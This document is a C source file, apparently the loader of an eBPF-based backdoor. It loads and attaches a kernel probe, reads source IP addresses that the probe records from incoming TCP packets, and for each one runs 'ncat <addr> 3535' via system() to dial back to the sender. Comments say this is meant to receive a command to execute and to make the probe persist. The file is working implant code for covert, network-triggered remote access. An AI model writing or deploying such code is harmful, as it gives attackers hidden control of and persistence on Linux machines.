
#include <stdio.h>
#include <stdlib.h>
#include <limits.h>
#include <bpf/bpf.h>
#include <bpf/libbpf.h>
#include <arpa/inet.h>
#include <unistd.h>
#include "proto.h"


#define PORT 3535

int main(int argc, char **argv) {
    char path[PATH_MAX] = "enohonk.o";
    int loaded;
    struct bpf_object *obj;
    printf("-----------------------------------------------\n");
    printf("Loading eBPF Probe: %s\n", path);
    obj = bpf_object__open(path);
    if (!obj) {
        printf("Unable to load eBPF object: %s\n", path);
        return 1;
    }

    loaded = bpf_object__load(obj);
    if (loaded < 0) {
        printf("Unable to start eBPF probe: %s\n", path);
        return 1;
    }
    printf("eBPF Probe Loaded: %s\n", path);

    // Name
    const char *objname = bpf_object__name(obj);
    printf("eBPF Object Name: %s\n", objname);

    struct bpf_program *program = NULL;

    // TODO Iterate over programs if we end up adding more
    program = bpf_object__next_program(obj, NULL);
    printf("eBPF Program Address: %p\n", program);

    // Program Name
    const char *progname = bpf_program__name(program);
    printf("eBPF Program Name: %s\n", progname);

    // Program Section Name
    const char *progsecname = bpf_program__section_name(program);
    printf("eBPF Program Section Name: %s\n", progsecname);


    struct bpf_link *link = bpf_program__attach(program);
    if (!link) {
        printf("Unable to link eBPF program: %s\n", progname);
        return 2;
    }

    // TODO We probably want to "pin" the eBPF probe so that it will persist

    struct bpf_map *map = bpf_object__next_map(obj, NULL);
    const char *mapname = bpf_map__name(map);
    printf("eBPF Map Name: %s\n", mapname);
    int fd = bpf_map__fd(map);

    printf("eBPF Program Linked!\n");
    printf("Logs: cat /sys/kernel/tracing/trace_pipe\n");
    printf("-----------------------------------------------\n");

    while(1) {
      int lookup_key = 0, next_key;
      struct tcp_return ret;
      int err;
      while (!bpf_map_get_next_key(fd, &lookup_key, &next_key)) {
        err = bpf_map_lookup_elem(fd, &next_key, &ret);
        if (err < 0) {
          return -1;
        }

        char addrbuf[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &ret.saddr, addrbuf, sizeof (addrbuf));

        printf("Begin reverse TCP protocol. Dial: %s\n", addrbuf);

        // TODO Dial back to source addr for the command to execute!

        char cmd[512];
        sprintf(cmd, "ncat %s %d", addrbuf, PORT);
        printf("%s\n", cmd);
        system(cmd);

        err = bpf_map_delete_elem(fd, &next_key);
        if (err < 0) {
          return -1;
        }
        lookup_key = next_key;
      }
    }
}